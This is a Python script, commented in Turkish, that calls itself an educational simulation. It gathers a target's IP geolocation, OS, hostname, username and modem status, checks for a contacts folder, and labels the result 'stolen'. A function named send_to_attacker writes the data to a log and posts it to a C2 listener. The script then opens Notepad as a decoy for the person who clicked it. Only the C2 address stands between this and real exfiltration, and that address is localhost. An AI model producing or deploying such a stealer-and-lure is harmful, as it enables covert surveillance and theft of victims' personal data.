import os
import sys
import json
import socket
import requests
import subprocess
import platform
import time
from datetime import datetime

# --- KONUM (IP tabanlı yaklaşık) ---
def get_location():
    try:
        response = requests.get('http://ip-api.com/json/', timeout=5)
        data = response.json()
        return {
            "ip": data.get('query'),
            "ulke": data.get('country'),
            "sehir": data.get('city'),
            "enlem": data.get('lat'),
            "boylam": data.get('lon'),
            "isp": data.get('isp')
        }
    except:
        return {"hata": "Konum alınamadı"}

# --- SİM / CİHAZ BİLGİLERİ (Windows) ---
def get_sim_device_info():
    info = {}
    # İşletim sistemi
    info["os"] = platform.system() + " " + platform.release()
    info["hostname"] = socket.gethostname()
    info["kullanici"] = os.getlogin()
    
    # Windows SIM bilgisi (MCC/MNC, telefon numarası YOK - root/jailbreak gerekir)
    if platform.system() == "Windows":
        try:
            # Modem bilgileri (genelde boş olur, konsept)
            result = subprocess.run(['wmic', 'path', 'win32_pnpentity', 'get', 'caption'], 
                                    capture_output=True, text=True, timeout=3)
            if "GSM" in result.stdout or "Mobile" in result.stdout:
                info["sim_durum"] = "Mobil modem algılandı (detay yok)"
            else:
                info["sim_durum"] = "SIM bilgisi alınamadı (sanal ortam)"
        except:
            info["sim_durum"] = "Erişim yok"
    
    # Android için (termux veya root)
    if os.path.exists("/system/bin/getprop") or os.path.exists("/system/bin/dumpsys"):
        try:
            subprocess.run(['which', 'termux-telephony-cell-info'], check=False)
            info["not"] = "SIM bilgisi için termux-telephony-cell-info gerekli"
        except:
            pass
    
    # Bilinen numaralar (Windows telefon uygulamasından - çok nadir)
    try:
        contacts_path = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Windows\Contacts")
        if os.path.exists(contacts_path):
            info["rehber_varlik"] = "Rehber verisi mevcut (açık metin değil)"
    except:
        pass
    
    return info

# --- KENDİ NUMARANIZI ALMA (sanal ortamda kendiniz girin) ---
def get_own_number():
    # Gerçek cihazda bu bilgiyi almak için root/Android Telephony API gerekir
    # Burada eğitim için manuel giriş yapılabilir
    return os.environ.get("TEST_NUMARASI", "Simulasyon_Numarasi_123")

# --- VERİYİ MERKEZE GÖNDERME (sizin terminaliniz) ---
def send_to_attacker(data):
    # Veriyi local log dosyasına yaz
    with open("logs/captured_data.txt", "a", encoding="utf-8") as f:
        f.write(f"\n{'='*50}\n")
        f.write(f"[{datetime.now()}] YENİ VERİ\n")
        f.write(json.dumps(data, indent=2, ensure_ascii=False))
        f.write(f"\n{'='*50}\n")
    
    # Kendi terminal sunucunuza göndermek için (localhost veya kendi IP'niz)
    try:
        # Önce local log'u oku
        print("[✓] Veri kaydedildi: logs/captured_data.txt")
        
        # Eğer bir C2 sunucunuz varsa (kendi localhost'unuz)
        C2_URL = "http://localhost:8080/capture"  # Kendi listener'ınız
        response = requests.post(C2_URL, json=data, timeout=2)
        print("[✓] Veri C2'ye gönderildi" if response.status_code == 200 else "[!] C2 ulaşılamadı")
    except:
        print("[!] C2 sunucuya bağlanılamadı, veri local log'da")

# --- ANA ÇALIŞTIRICI ---
def main():
    print("[*] Bilgi toplama başlatıldı (Eğitim simülasyonu)")
    
    # Toplanan veri
    stolen = {
        "timestamp": str(datetime.now()),
        "konum": get_location(),
        "cihaz_bilgileri": get_sim_device_info(),
        "kendi_numaraniz": get_own_number(),
        "test_modu": "Sadece eğitim - Gerçek SIM/numara verisi alınmamıştır"
    }
    
    # Local log
    send_to_attacker(stolen)
    
    # İsteğe bağlı: Tıklayan kişiye masum bir şey göster (örnek: PDF açılıyor gibi)
    print("\n[!] Bu bir eğitim simülasyonudur. Gerçekte hiçbir veri toplanmamıştır.")
    time.sleep(3)
    
    # Gerçek bir dosya aç (örnek: boş bir PDF)
    try:
        os.system("start notepad.exe" if platform.system() == "Windows" else "echo Bu bir testtir")
    except:
        pass

if __name__ == "__main__":
    main()
